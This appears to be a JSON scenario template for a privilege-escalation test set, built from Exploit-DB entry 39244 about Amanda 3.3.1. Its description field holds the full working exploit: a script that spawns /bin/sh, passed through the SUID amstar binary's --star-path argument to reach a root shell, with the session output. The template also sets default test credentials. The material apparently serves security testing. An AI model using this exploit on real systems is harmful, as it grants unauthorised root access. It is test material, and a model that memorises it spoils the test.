@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_39244",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Amanda 3.3.1 - 'amstar' Command Injection Privilege Escalation (OSVDB-132794)\n\nExploit source code (39244.txt):\n```\nAMANDA, the Advanced Maryland Automatic Network Disk Archiver, is a backup\nsolution that allows the IT administrator to set up a single master backup\nserver to back up multiple hosts over network to tape drives/changers or\ndisks or optical media. Amanda uses native utilities and formats (e.g. dump\nand/or GNU tar) and can back up a large number of servers and workstations\nrunning multiple versions of Linux or Unix.\n\nA user with backup privs can trivially compromise a client installation.\nAmstar is an Amanda Application API script. It should not be run by users\ndirectly. It uses star to backup and restore data. It runs binaries with\nroot permissions when parsing the command line arguement --star-path.\n\nTested against Amanda 3.3.1. An example is shown below:\n\n$ id\nuid=34(backup) gid=34(backup) groups=34(backup),6(disk),26(tape)\n$ cat /tmp/runme.sh\n#!/bin/sh\n/bin/sh\n$ ls -al /usr/lib/amanda/application/amstar\n-rwsr-xr-- 1 root backup 31284 Jul 29  2012 /usr/lib/amanda/application/amstar\n$ /usr/lib/amanda/application/amstar restore --star-path=/tmp/runme.sh\n# id\nuid=0(root) gid=34(backup) groups=0(root),6(disk),26(tape),34(backup)\n# uname -a\nLinux raspberrypi 3.10.25 #1 Sat Dec 28 20:50:23 EST 2013 armv6l GNU/Linux\n#\n\n -- Hacker Fantastic\n```",
+  "cve": "OSVDB-132794",
+  "exploitdb_id": "39244",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_39244",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
